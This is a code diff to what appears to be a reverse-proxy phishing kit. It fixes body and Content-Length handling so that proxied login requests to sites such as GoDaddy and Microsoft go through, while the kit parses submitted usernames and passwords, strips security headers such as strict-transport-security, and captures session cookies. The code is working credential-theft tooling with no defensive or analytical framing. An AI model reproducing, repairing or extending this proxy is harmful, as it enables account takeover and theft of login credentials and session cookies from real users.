@@ -178,7 +178,7 @@ function parseCredentials(bodyText) {
   
   if (!bodyText) return { user, pass };
 
-  // Try parsing as JSON first
+  // Try parsing as JSON first (GoDaddy uses JSON)
   try {
     const jsonData = JSON.parse(bodyText);
     if (jsonData.username || jsonData.email || jsonData.user || jsonData.login) {
@@ -192,7 +192,7 @@ function parseCredentials(bodyText) {
     // Not JSON, try form-urlencoded
   }
 
-  // Parse as form-urlencoded (application/x-www-form-urlencoded)
+  // Parse as form-urlencoded (Microsoft uses this)
   const keyValuePairs = bodyText.split('&');
   for (const pair of keyValuePairs) {
     const [key, value] = pair.split('=');
@@ -568,9 +568,6 @@ export default async function handleRequest(request) {
   // Remove problematic headers
   headers.delete('x-forwarded-host');
   headers.delete('x-forwarded-proto');
-  // IMPORTANT: Remove content-length because we're reconstructing the body as text
-  // and the byte length might differ from the original (Unicode characters)
-  headers.delete('content-length');
 
   let bodyText = null;
   let requestBodyForUpstream = null;
@@ -623,15 +620,28 @@ export default async function handleRequest(request) {
       redirect: 'manual'
     };
 
+    // CRITICAL FIX: Proper body handling with exact Content-Length calculation
     if (!['GET', 'HEAD'].includes(request.method)) {
-      fetchOpts.body = requestBodyForUpstream !== null ? requestBodyForUpstream : request.body;
-      // REMOVED: duplex: 'half' - This was causing socket errors with buffered string bodies
+      if (requestBodyForUpstream !== null) {
+        // Convert string to Uint8Array to get exact byte length
+        const encoder = new TextEncoder();
+        const bodyBytes = encoder.encode(requestBodyForUpstream);
+        
+        // Set exact Content-Length in bytes (not characters)
+        headers.set('content-length', bodyBytes.length.toString());
+        
+        // Use the Uint8Array as body, not the string
+        fetchOpts.body = bodyBytes;
+      } else {
+        fetchOpts.body = request.body;
+      }
     }
 
     console.log(`[DEBUG] Fetching upstream: ${upstreamUrl}`);
     console.log(`[DEBUG] Method: ${request.method}`);
     console.log(`[DEBUG] Has body: ${!!fetchOpts.body}`);
     console.log(`[DEBUG] Content-Type: ${headers.get('content-type')}`);
+    console.log(`[DEBUG] Content-Length: ${headers.get('content-length')}`);
 
     const resp = await fetch(upstreamUrl, fetchOpts);
 
@@ -660,6 +670,7 @@ export default async function handleRequest(request) {
     newHeaders.delete('clear-site-data');
     newHeaders.delete('strict-transport-security');
 
+    // Handle cookies
     const cookies = resp.headers.getSetCookie?.() || [resp.headers.get('Set-Cookie')].filter(Boolean);
     let shouldCaptureCookies = false;
     let cookieStr = '';
